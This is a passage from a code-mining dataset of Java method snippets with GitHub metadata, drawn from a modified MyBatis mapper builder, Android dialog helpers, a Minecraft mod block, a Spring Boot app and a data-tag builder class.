context.getIntAttribute(\"size\");\n      boolean readWrite = !context.getBooleanAttribute(\"readOnly\", false);\n      boolean blocking = context.getBooleanAttribute(\"blocking\", false);\n      Properties props = context.getChildrenAsProperties();\n      builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30490, "method_name": "parameterMapElement", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parameterMapElement(List<XNode> list) {\n    for (XNode parameterMapNode : list) {\n      String id = parameterMapNode.getStringAttribute(\"id\");\n      String type = parameterMapNode.getStringAttribute(\"type\");\n      Class<?> parameterClass = resolveClass(type);\n      List<XNode> parameterNodes = parameterMapNode.evalNodes(\"parameter\");\n      List<ParameterMapping> parameterMappings = new ArrayList<>();\n      for (XNode parameterNode : parameterNodes) {\n        String property = parameterNode.getStringAttribute(\"property\");\n        String javaType = parameterNode.getStringAttribute(\"javaType\");\n        String jdbcType = parameterNode.getStringAttribute(\"jdbcType\");\n        String resultMap = parameterNode.getStringAttribute(\"resultMap\");\n        String mode = parameterNode.getStringAttribute(\"mode\");\n        String typeHandler = parameterNode.getStringAttribute(\"typeHandler\");\n        Integer numericScale = parameterNode.getIntAttribute(\"numericScale\");\n        ParameterMode modeEnum = resolveParameterMode(mode);\n        Class<?> javaTypeClass = resolveClass(javaType);\n        JdbcType jdbcTypeEnum = resolveJdbcType(jdbcType);\n        Class<? extends TypeHandler<?>> typeHandlerClass = resolveClass(typeHandler);\n        ParameterMapping parameterMapping = builderAssistant.buildParameterMapping(parameterClass, property, javaTypeClass, jdbcTypeEnum, resultMap, modeEnum, typeHandlerClass, numericScale);\n        parameterMappings.add(parameterMapping);\n      }\n      builderAssistant.addParameterMap(id, parameterClass, parameterMappings);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30491, "method_name": "resultMapElements", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resultMapElements(List<XNode> list) {\n    for (XNode resultMapNode : list) {\n      try {\n        resultMapElement(resultMapNode);\n      } catch (IncompleteElementException e) {\n        // ignore, it will be retried\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30492, "method_name": "resultMapElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "ResultMap", "snippet": "  private ResultMap resultMapElement(XNode resultMapNode) {\n    return resultMapElement(resultMapNode, Collections.emptyList(), null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30493, "method_name": "resultMapElement", "class_name": "XMLMapperBuilder", "params": ["XNode", "List<ResultMapping>", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "ResultMap", "snippet": "  private ResultMap resultMapElement(XNode resultMapNode, List<ResultMapping> additionalResultMappings, Class<?> enclosingType) {\n    ErrorContext.instance().activity(\"processing \" + resultMapNode.getValueBasedIdentifier());\n    String type = resultMapNode.getStringAttribute(\"type\",\n        resultMapNode.getStringAttribute(\"ofType\",\n            resultMapNode.getStringAttribute(\"resultType\",\n                resultMapNode.getStringAttribute(\"javaType\"))));\n    //Class<?> typeClass = resolveClass(type); modify by xuliang 20200403\n    Class<?> typeClass =Object.class;\n    if (typeClass == null) {\n      typeClass = inheritEnclosingType(resultMapNode, enclosingType);\n    }\n    Discriminator discriminator = null;\n    List<ResultMapping> resultMappings = new ArrayList<>(additionalResultMappings);\n    List<XNode> resultChildren = resultMapNode.getChildren();\n    for (XNode resultChild : resultChildren) {\n      if (\"constructor\".equals(resultChild.getName())) {\n        processConstructorElement(resultChild, typeClass, resultMappings);\n      } else if (\"discriminator\".equals(resultChild.getName())) {\n        discriminator = processDiscriminatorElement(resultChild, typeClass, resultMappings);\n      } else {\n        List<ResultFlag> flags = new ArrayList<>();\n        if (\"id\".equals(resultChild.getName())) {\n          flags.add(ResultFlag.ID);\n        }\n        resultMappings.add(buildResultMappingFromContext(resultChild, typeClass, flags));\n      }\n    }\n    String id = resultMapNode.getStringAttribute(\"id\",\n            resultMapNode.getValueBasedIdentifier());\n    String extend = resultMapNode.getStringAttribute(\"extends\");\n    Boolean autoMapping = resultMapNode.getBooleanAttribute(\"autoMapping\");\n    ResultMapResolver resultMapResolver = new ResultMapResolver(builderAssistant, id, typeClass, extend, discriminator, resultMappings, autoMapping);\n    try {\n      return resultMapResolver.resolve();\n    } catch (IncompleteElementException  e) {\n      configuration.addIncompleteResultMap(resultMapResolver);\n      throw e;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30494, "method_name": "inheritEnclosingType", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "Class<?>", "snippet": "  protected Class<?> inheritEnclosingType(XNode resultMapNode, Class<?> enclosingType) {\n    if (\"association\".equals(resultMapNode.getName()) && resultMapNode.getStringAttribute(\"resultMap\") == null) {\n      String property = resultMapNode.getStringAttribute(\"property\");\n      if (property != null && enclosingType != null) {\n        MetaClass metaResultType = MetaClass.forClass(enclosingType, configuration.getReflectorFactory());\n        return metaResultType.getSetterType(property);\n      }\n    } else if (\"case\".equals(resultMapNode.getName()) && resultMapNode.getStringAttribute(\"resultMap\") == null) {\n      return enclosingType;\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30495, "method_name": "processConstructorElement", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>", "List<ResultMapping>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void processConstructorElement(XNode resultChild, Class<?> resultType, List<ResultMapping> resultMappings) {\n    List<XNode> argChildren = resultChild.getChildren();\n    for (XNode argChild : argChildren) {\n      List<ResultFlag> flags = new ArrayList<>();\n      flags.add(ResultFlag.CONSTRUCTOR);\n      if (\"idArg\".equals(argChild.getName())) {\n        flags.add(ResultFlag.ID);\n      }\n      resultMappings.add(buildResultMappingFromContext(argChild, resultType, flags));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30496, "method_name": "processDiscriminatorElement", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>", "List<ResultMapping>"], "throws": null, "modifiers": ["private"], "return_type": "Discriminator", "snippet": "  private Discriminator processDiscriminatorElement(XNode context, Class<?> resultType, List<ResultMapping> resultMappings) {\n    String column = context.getStringAttribute(\"column\");\n    String javaType = context.getStringAttribute(\"javaType\");\n    String jdbcType = context.getStringAttribute(\"jdbcType\");\n    String typeHandler = context.getStringAttribute(\"typeHandler\");\n    Class<?> javaTypeClass = resolveClass(javaType);\n    Class<? extends TypeHandler<?>> typeHandlerClass = resolveClass(typeHandler);\n    JdbcType jdbcTypeEnum = resolveJdbcType(jdbcType);\n    Map<String, String> discriminatorMap = new HashMap<>();\n    for (XNode caseChild : context.getChildren()) {\n      String value = caseChild.getStringAttribute(\"value\");\n      String resultMap = caseChild.getStringAttribute(\"resultMap\", processNestedResultMappings(caseChild, resultMappings, resultType));\n      discriminatorMap.put(value, resultMap);\n    }\n    return builderAssistant.buildDiscriminator(resultType, column, javaTypeClass, jdbcTypeEnum, typeHandlerClass, discriminatorMap);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30497, "method_name": "sqlElement", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sqlElement(List<XNode> list) {\n    if (configuration.getDatabaseId() != null) {\n      sqlElement(list, configuration.getDatabaseId());\n    }\n    sqlElement(list, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30498, "method_name": "sqlElement", "class_name": "XMLMapperBuilder", "params": ["List<XNode>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sqlElement(List<XNode> list, String requiredDatabaseId) {\n    for (XNode context : list) {\n      String databaseId = context.getStringAttribute(\"databaseId\");\n      String id = context.getStringAttribute(\"id\");\n      id = builderAssistant.applyCurrentNamespace(id, false);\n      if (databaseIdMatchesCurrent(id, databaseId, requiredDatabaseId)) {\n        if(!sqlFragments.containsKey(id)) { //add by xuliang 20200407\n          sqlFragments.put(id, context);\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30499, "method_name": "databaseIdMatchesCurrent", "class_name": "XMLMapperBuilder", "params": ["String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean databaseIdMatchesCurrent(String id, String databaseId, String requiredDatabaseId) {\n    if (requiredDatabaseId != null) {\n      return requiredDatabaseId.equals(databaseId);\n    }\n    if (databaseId != null) {\n      return false;\n    }\n    if (!this.sqlFragments.containsKey(id)) {\n      return true;\n    }\n    // skip this fragment if there is a previous one with a not null databaseId\n    XNode context = this.sqlFragments.get(id);\n    return context.getStringAttribute(\"databaseId\") == null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30500, "method_name": "buildResultMappingFromContext", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>", "List<ResultFlag>"], "throws": null, "modifiers": ["private"], "return_type": "ResultMapping", "snippet": "  private ResultMapping buildResultMappingFromContext(XNode context, Class<?> resultType, List<ResultFlag> flags) {\n    String property;\n    if (flags.contains(ResultFlag.CONSTRUCTOR)) {\n      property = context.getStringAttribute(\"name\");\n    } else {\n      property = context.getStringAttribute(\"property\");\n    }\n    String column = context.getStringAttribute(\"column\");\n    String javaType = context.getStringAttribute(\"javaType\");\n    String jdbcType = context.getStringAttribute(\"jdbcType\");\n    String nestedSelect = context.getStringAttribute(\"select\");\n    String nestedResultMap = context.getStringAttribute(\"resultMap\", () ->\n      processNestedResultMappings(context, Collections.emptyList(), resultType));\n    String notNullColumn = context.getStringAttribute(\"notNullColumn\");\n    String columnPrefix = context.getStringAttribute(\"columnPrefix\");\n    String typeHandler = context.getStringAttribute(\"typeHandler\");\n    String resultSet = context.getStringAttribute(\"resultSet\");\n    String foreignColumn = context.getStringAttribute(\"foreignColumn\");\n    boolean lazy = \"lazy\".equals(context.getStringAttribute(\"fetchType\", configuration.isLazyLoadingEnabled() ? \"lazy\" : \"eager\"));\n    Class<?> javaTypeClass = resolveClass(javaType);\n   // Class<? extends TypeHandler<?>> typeHandlerClass = resolveClass(typeHandler); //modify by xuliang 20200403\n    Class<? extends TypeHandler<?>> typeHandlerClass = ObjectTypeHandler.class;\n    JdbcType jdbcTypeEnum = resolveJdbcType(jdbcType);\n    return builderAssistant.buildResultMapping(resultType, property, column, javaTypeClass, jdbcTypeEnum, nestedSelect, nestedResultMap, notNullColumn, columnPrefix, typeHandlerClass, flags, resultSet, foreignColumn, lazy);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30501, "method_name": "processNestedResultMappings", "class_name": "XMLMapperBuilder", "params": ["XNode", "List<ResultMapping>", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String processNestedResultMappings(XNode context, List<ResultMapping> resultMappings, Class<?> enclosingType) {\n    if (\"association\".equals(context.getName())\n        || \"collection\".equals(context.getName())\n        || \"case\".equals(context.getName())) {\n      if (context.getStringAttribute(\"select\") == null) {\n        validateCollection(context, enclosingType);\n        ResultMap resultMap = resultMapElement(context, resultMappings, enclosingType);\n        return resultMap.getId();\n      }\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30502, "method_name": "validateCollection", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void validateCollection(XNode context, Class<?> enclosingType) {\n    if (\"collection\".equals(context.getName()) && context.getStringAttribute(\"resultMap\") == null\n        && context.getStringAttribute(\"javaType\") == null) {\n      MetaClass metaResultType = MetaClass.forClass(enclosingType, configuration.getReflectorFactory());\n      String property = context.getStringAttribute(\"property\");\n      /*if (!metaResultType.hasSetter(property)) {\n        throw new BuilderException(\n          \"Ambiguous collection type for property '\" + property + \"'. You must specify 'javaType' or 'resultMap'.\");\n      }*/ //delete by xuliang 202020407\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30503, "method_name": "bindMapperForNamespace", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void bindMapperForNamespace() {\n    String namespace = builderAssistant.getCurrentNamespace();\n    if (namespace != null) {\n      Class<?> boundType = null;\n      try {\n        boundType = Resources.classForName(namespace);\n      } catch (ClassNotFoundException e) {\n        //ignore, bound type is not required\n      }\n      if (boundType != null) {\n        if (!configuration.hasMapper(boundType)) {\n          // Spring may not know the real resource name so we set a flag\n          // to prevent loading again this resource from the mapper interface\n          // look at MapperAnnotationBuilder#loadXmlResource\n          configuration.addLoadedResource(\"namespace:\" + namespace);\n          configuration.addMapper(boundType);\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30504, "method_name": "accept", "class_name": "MuseumObjectStructure", "params": ["Visitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accept(Visitor visitor) {\n        Iterator<Museum> i = lists.iterator();\n        while(i.hasNext()) {\n            ((Museum) i.next()).accept(visitor);\n        }\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/MuseumObjectStructure.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30505, "method_name": "add", "class_name": "MuseumObjectStructure", "params": ["Museum"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void add(Museum museum) {\n        lists.add(museum);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/MuseumObjectStructure.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30506, "method_name": "remove", "class_name": "MuseumObjectStructure", "params": ["Museum"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void remove(Museum museum) {\n        lists.remove(museum);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/MuseumObjectStructure.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30507, "method_name": "main", "class_name": "RemettantApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(RemettantApplication.class, args);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/RemettantApplication.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30508, "method_name": "clock", "class_name": "RemettantApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Clock", "snippet": "    public Clock clock() {\n        return Clock.system(ZoneId.of(ZONE_UTC));\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/RemettantApplication.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30509, "method_name": "initElements", "class_name": "SpruceParquetBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SpruceParquetBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30510, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SpruceParquetBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30511, "method_name": "createDialog", "class_name": "ErrorDialogFragments", "params": ["Context", "Bundle", "OnClickListener"], "throws": null, "modifiers": ["public", "static"], "return_type": "Dialog", "snippet": "    public static Dialog createDialog(Context context, Bundle arguments, OnClickListener onClickListener) {\n        AlertDialog.Builder builder = new AlertDialog.Builder(context);\n        builder.setTitle(arguments.getString(ErrorDialogManager.KEY_TITLE));\n        builder.setMessage(arguments.getString(ErrorDialogManager.KEY_MESSAGE));\n        if (ERROR_DIALOG_ICON != 0) {\n            builder.setIcon(ERROR_DIALOG_ICON);\n        }\n        builder.setPositiveButton(android.R.string.ok, onClickListener);\n        return builder.create();\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30512, "method_name": "handleOnClick", "class_name": "ErrorDialogFragments", "params": ["DialogInterface", "int", "Activity", "Bundle"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void handleOnClick(DialogInterface dialog, int which, Activity activity, Bundle arguments) {\n        if (EVENT_TYPE_ON_CLICK != null) {\n            EventMessage event;\n            try {\n                event = new EventMessage(\"dialog click!\",EventKey.FRAGMENT_CLICK);\n            } catch (Exception e) {\n                throw new RuntimeException(\"Event cannot be constructed\", e);\n            }\n            KeventBus eventBus = ErrorDialogManager.factory.config.getEventBus();\n            eventBus.post(event);\n        }\n        boolean finish = arguments.getBoolean(ErrorDialogManager.KEY_FINISH_AFTER_DIALOG, false);\n        if (finish && activity != null) {\n            activity.finish();\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30513, "method_name": "onCreateDialog", "class_name": "Honeycomb", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "        public Dialog onCreateDialog(Bundle savedInstanceState) {\n            return createDialog(getActivity(), getArguments(), this);\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "android", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 30514, "method_name": "onClick", "class_name": "Honeycomb", "params": ["DialogInterface", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(DialogInterface dialog, int which) {\n            handleOnClick(dialog, which, getActivity(), getArguments());\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "android", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 30515, "method_name": "onCreateDialog", "class_name": "Support", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "        public Dialog onCreateDialog(Bundle savedInstanceState) {\n            return createDialog(getActivity(), getArguments(), this);\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "DialogFragment", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 30516, "method_name": "onClick", "class_name": "Support", "params": ["DialogInterface", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(DialogInterface dialog, int which) {\n            handleOnClick(dialog, which, getActivity(), getArguments());\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "DialogFragment", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 30517, "method_name": "onTransitionStart", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionStart(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 30518, "method_name": "onTransitionEnd", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionEnd(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 30519, "method_name": "onTransitionCancel", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionCancel(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 30520, "method_name": "onTransitionPause", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionPause(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 30521, "method_name": "onTransitionResume", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionResume(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 30522, "method_name": "setDataType", "class_name": "TagBuilder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataType(int dataType){\n        this.dataType = dataType;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30523, "method_name": "getDataType", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDataType(){\n        return dataType;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30524, "method_name": "setDataSize", "class_name": "TagBuilder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSize(int size){\n        this.dataSize = size;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30525, "method_name": "getDataSize", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDataSize(){\n        return dataSize;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30526, "method_name": "setStartingIndex", "class_name": "TagBuilder", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStartingIndex(long startingIndex){\n        this.startingIndex = startingIndex;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30527, "method_name": "getStartingIndex", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getStartingIndex(){\n        return startingIndex;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30528, "method_name": "setName", "class_name": "TagBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String s){\n       this.name = s;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30529, "method_name": "getName", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName(){\n        return this.name;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30530, "method_name": "setNameSize", "class_name": "TagBuilder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNameSize(int size){\n        this.nameSize = size;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30531, "method_name": "getNameSize", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNameSize(){\n        return this.nameSize;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30532, "method_name": "setValueBytes", "class_name": "TagBuilder", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValueBytes(byte[] valueBytes){\n        this.valueBytes = valueBytes;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, 